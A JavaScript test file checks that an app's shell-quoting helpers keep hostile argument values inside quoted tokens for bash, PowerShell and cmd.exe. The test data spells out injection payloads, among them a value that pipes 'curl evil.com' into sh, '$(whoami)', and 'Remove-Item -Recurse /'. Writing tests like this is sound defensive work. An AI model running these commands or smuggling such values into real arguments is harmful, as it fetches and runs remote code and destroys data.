// Shell quoting: what stands between a value we did not write and the shell (#76).
//
// These tests were `schedule-injection.test.js`, because the scheduler was the path that fed
// user-authored frontmatter into an argv. The scheduler is gone (#246, spec 14) — the quoting is not:
// every spawn that builds a command string for a shell goes through `quoteArgvForShell`, and a
// pre-launch command, a custom launcher and a template's env all carry text somebody else wrote.
//
// The end-to-end case at the bottom kept its shape and lost its scheduler: it takes an argv full of
// injection attempts and asserts that nothing dangerous ends up OUTSIDE a quoted token. That property
// is the whole point and it never depended on where the argv came from.

const test = require('node:test');
const assert = require('node:assert/strict');

const { quoteArgForShell, quoteArgvForShell } = require('../src/app/terminal/shell-profiles');

test('quoteArgForShell neutralizes bash injection', () => {
  const evil = 'x"; curl evil.com/sh | sh; echo "';
  const quoted = quoteArgForShell('/bin/bash', evil);
  // Single-quoted, so the shell passes the whole thing as one arg.
  assert.ok(quoted.startsWith("'"));
  assert.ok(quoted.endsWith("'"));
  // Single quotes in the value are escaped as '\''
  const withQuote = quoteArgForShell('/bin/bash', "it's");
  assert.equal(withQuote, "'it'\\''s'");
});

test('quoteArgForShell handles backticks and $() — these must not be evaluated', () => {
  const evil = '`whoami`';
  const quoted = quoteArgForShell('/bin/bash', evil);
  assert.equal(quoted, "'`whoami`'");

  const dollar = '$(id)';
  assert.equal(quoteArgForShell('/bin/bash', dollar), "'$(id)'");
});

test('quoteArgvForShell joins multiple args with spaces, each safely quoted', () => {
  const joined = quoteArgvForShell('/bin/bash', ['--model', 'x"; evil', '--flag']);
  assert.equal(joined, "'--model' 'x\"; evil' '--flag'");
});

test('quoteArgForShell produces PowerShell-safe quoting', () => {
  const evil = "'; Remove-Item -Recurse /";
  const quoted = quoteArgForShell('/usr/bin/pwsh', evil);
  // PowerShell: wrap in ' ... ' and double internal ' → ''.
  // '; becomes '' and wrapped → ''';<rest>'
  assert.equal(quoted, "'''; Remove-Item -Recurse /'");
});

test('quoteArgForShell produces cmd.exe-safe quoting (issue #76)', () => {
  // Wrap in double quotes; inside quotes cmd already treats & | < > literally, so
  // there must be NO stray ^ (the old code produced "a^&b").
  assert.equal(quoteArgForShell('cmd.exe', 'a&b'), '"a&b"');
  assert.equal(quoteArgForShell('C:\\Windows\\System32\\cmd.exe', 'a|b<c>d'), '"a|b<c>d"');
  // Embedded quotes are doubled ("") — the cmd in-quote escape — not backslashed.
  assert.equal(quoteArgForShell('cmd.exe', 'say "hi"'), '"say ""hi"""');
  assert.ok(!quoteArgForShell('cmd.exe', 'x"').includes('\\"'), 'must not use \\" (not a cmd escape)');
  // We never corrupt % (no bogus %% doubling). cmd's own %VAR% expansion inside
  // quotes is a documented limitation of this fallback path, not our mangling.
  assert.equal(quoteArgForShell('cmd.exe', '%PATH%'), '"%PATH%"');
});

test('quoteArgForShell leaves bare-safe cmd.exe tokens unquoted', () => {
  // node-pty's argsToCommandLine escapes embedded `"` as `\"`, which cmd.exe
  // does not understand — needless quotes around plain tokens reach the child
  // argv as literal quote chars (the Claude CLI then eats "--session-id" as a
  // positional prompt). Flags, UUIDs and plain paths must stay bare.
  assert.equal(quoteArgForShell('cmd.exe', '--session-id'), '--session-id');
  assert.equal(quoteArgForShell('cmd.exe', '0197c1a2-1111-2222-3333-444455556666'),
    '0197c1a2-1111-2222-3333-444455556666');
  assert.equal(quoteArgForShell('cmd.exe', '--ide'), '--ide');
  assert.equal(quoteArgForShell('cmd.exe', 'C:\\Projects\\demo'), 'C:\\Projects\\demo');
  // Anything with whitespace still gets quoted.
  assert.equal(quoteArgForShell('cmd.exe', 'two words'), '"two words"');
  // Empty stays a quoted empty token, not a vanished argument.
  assert.equal(quoteArgForShell('cmd.exe', ''), '""');
});

test('a whole command line stays safe under hostile argv values', () => {
  // Every one of these came from a user-editable source in the original defect.
  const argv = [
    '--permission-mode', 'acceptEdits',
    '--model', 'x"; curl evil.com | sh; echo "',
    '--allowedTools', 'Bash,Read',
    '--append-system-prompt', '$(whoami)',
    '--add-dir', '/tmp,/etc; touch /tmp/pwned',
  ];
  const cmd = 'claude ' + quoteArgvForShell('/bin/bash', argv);

  // Walk the command and extract only the text outside single-quoted tokens.
  // If any shell metacharacter appears in that "outside" text, injection leaked.
  let outside = '';
  let inQuote = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (c === "'") { inQuote = !inQuote; continue; }
    if (!inQuote) outside += c;
  }
  // Outside of quoted tokens we should only see: `claude`, spaces, and at most the
  // `\` from the POSIX `'\''` escape (which always immediately re-enters a quote).
  assert.ok(!/curl/.test(outside), `curl leaked outside quotes: "${outside}"`);
  assert.ok(!/whoami/.test(outside), `whoami leaked outside quotes: "${outside}"`);
  assert.ok(!/touch/.test(outside), `touch leaked outside quotes: "${outside}"`);
  assert.ok(!/[;|&`$]/.test(outside), `shell metachar leaked outside quotes: "${outside}"`);
  // Argv tokens survive as single-quoted strings.
  assert.ok(cmd.includes(`'x"; curl evil.com | sh; echo "'`), `expected quoted model arg in: ${cmd}`);
});
